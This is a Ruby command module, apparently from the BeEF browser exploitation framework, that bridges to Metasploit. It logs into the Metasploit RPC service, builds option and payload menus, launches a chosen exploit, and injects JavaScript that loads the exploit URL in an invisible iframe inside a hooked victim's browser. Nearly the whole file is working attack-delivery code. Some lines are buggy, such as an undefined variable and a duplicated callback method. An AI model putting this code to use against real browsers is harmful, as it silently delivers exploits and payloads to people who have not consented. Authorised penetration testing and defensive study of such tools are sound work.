module BeEF
module Modules
module Commands


class Msf < BeEF::Command

  
  def initialize
    super({
      'Name' => 'Generic Metasploit Exploit',

      'Description' => %Q{
        This module will launch a Metasploit exploit against the host
        },
      'Category' => 'Metasploit',
      'Author' => ['sussurro'],
      'Data' => [ ], 
      'File' => __FILE__,
    })

    use 'beef.dom'
  end
  
  def callback
                save({'result' => @datastore['result']})
  end

  # 
	def update_info(id)
				mod = BeEF::Models::CommandModule.first(:id => id)
				msfinfo = nil
        targets = []
        
				if mod.dynamic_command_info == nil
				  
					msf = BeEF::MsfClient.new
					msf.login()
					msfinfo = msf.get_exploit_info(mod.name)

				  st = mod.name.split('/').first
				  puts "st: " + st

					os_name = BeEF::Constants::Os::match_os(st)
					browsers =  BeEF::Constants::Browsers::match_browser(msfi['name'] + msfi['targets'].to_json)

					targets << {'os_name' => os_name, 'browser_name' => 'ALL'} if browsers.count == 0

					browsers.each do |bn|
						targets << {'os_name' => os_name, 'browser_name' => bn}
					end

				  mod.dynamic_command_info = BeEF::Models::DynamicCommandInfo.new( 
																				 :name => msfinfo['name'],
																				 :description => msfinfo['description'],
																				 :targets => targets.to_json);
					mod.save
				else
					msfinfo = mod.dynamic_command_info
					targets = JSON.parse(msfinfo['targets'])
				end
				@info['Name'] = msfinfo['name']
				@info['Description'] = msfinfo['description']
				@info['MsfModName'] = mod.name
				@info['mod-id'] = mod.id
				@info['msfid'] = mod.name
				@target = targets

	end
	def update_data()
				modname = @info['MsfModName']

				msf = BeEF::MsfClient.new
				msf.login()

				msfoptions = msf.get_options(modname)
			  msfoptions.keys.each { |k|
								next if msfoptions[k]['advanced'] == true
								next if msfoptions[k]['evasion'] == true
							  @info['Data'] << { 'name' => k + '_txt', 'type' => 'label', 'html' => msfoptions[k]['desc']}
							  case msfoptions[k]['type']
							  when "string","address","port"
									@info['Data'] << {'name' => k , 'ui_label' => k, 'value' => msfoptions[k]['default']}
								when "bool"
									@info['Data'] <<  {'name' => k, 'type' => 'checkbox', 'ui_label' => k }
							  when "enum"
									@info['Data'] << { 'name' => k, 'type' => 'combobox', 'ui_label' => k, 'store_type' => 'arraystore', 'store_fields' => ['enum'], 'store_data' => msfoptions[k]['enums'], 'valueField' => 'enum', 'displayField' => 'enum' , 'autoWidth' => true, 'mode' => 'local', 'value' => msfoptions[k]['default']}
								else
									print "K => #{k}\n"
									print "Status => #{msfoptions[k]['advanced']}\n"
								end
				}

				msfpayloads = msf.get_payloads(modname)
				payloads = msfpayloads['payloads']
				pl = []
				payloads.each { |p|
						pl << [p]
			  }	
				
				@info['Data'] << { 'name' => 'PAYLOAD', 
				  'type' => 'combobox', 
					'ui_label' => 'Payload',
					'store_type' => 'arraystore', 
					'store_fields' => ['payload'], 
					'store_data' => pl, 
					'valueField' => 'payload', 
					'displayField' => 'payload' , 
					'autoWidth' => true,
					'mode' => 'local',
					'reloadOnChange' => true, # this will trigger a reload of the payload options
					'emptyText' => "select a payload..."}

					@info['Data'] << { 'name' => 'mod_id' , 'id' => 'mod_id', 'type' => 'hidden', 'value' => @info['mod-id'] }
				
	end

  def get_payload_options(payload_name)
    # get payload options from metasploit
  	msf_xmlrpc_clinet = BeEF::MsfClient.new()
		msf_xmlrpc_clinet.login()
    payload_options = msf_xmlrpc_clinet.payload_options(payload_name)
    
    info = {}
    info['Data'] = []

	  payload_options.keys.each { |k|
						next if payload_options[k]['advanced'] == true
						next if payload_options[k]['evasion'] == true
					    info['Data'] << { 'name' => k + '_txt', 'type' => 'label', 'html' => payload_options[k]['desc']}
					  case payload_options[k]['type']
					  when "string","address","port","raw","path", "integer"
							info['Data'] << {'name' => k , 'ui_label' => k, 'value' => payload_options[k]['default']}
						when "bool"
							info['Data'] <<  {'name' => k, 'type' => 'checkbox', 'ui_label' => k }
					  when "enum"
							info['Data'] << { 'name' => k, 'type' => 'combobox', 'ui_label' => k, 'store_type' => 'arraystore', 'store_fields' => ['enum'], 'store_data' => payload_options[k]['enums'], 'valueField' => 'enum', 'displayField' => 'enum' , 'autoWidth' => true, 'mode' => 'local', 'value' => payload_options[k]['default']}
						else
						  # Debug output if the payload option type isn't found
							puts "K => #{k}\n"
							puts "Status => #{payload_options[k]['advanced']}\n"
							puts "Type => #{payload_options[k]['type']}\n"
							puts payload_options[k]
						end
		}
    
    # turn results into JSON
    payload_options_json = []
    payload_options_json[1] = JSON.parse(info.to_json)
    
    JSON.parse(info.to_json)
    
  end
  def launch_exploit(opts)

		msf = BeEF::MsfClient.new
		msf.login()
		ret = msf.launch_exploit(@info['msfid'],opts)
		@output = "<script>alert('#{ret['uri']}')</script>\n" if ret['result'] == 'success'
		ret
	end


	def output
			if @datastore
				@datastore['command_url'] = BeEF::HttpHookServer.instance.get_command_url(@default_command_url)
				@datastore['command_id'] = @command_id
			end


			return "
			
beef.execute(function() {
        var result; 

        try { 
                var sploit = beef.dom.createInvisibleIframe();
                sploit.src = '#{datastore['sploit_url']}';
        } catch(e) { 
                for(var n in e) 
                        result+= n + ' '  + e[n] ; 
        } 

});"
	end
	  def callback
			content = {}
			content['Exploit Results'] = @datastore['result']
			save content
		end


end


end
end
end


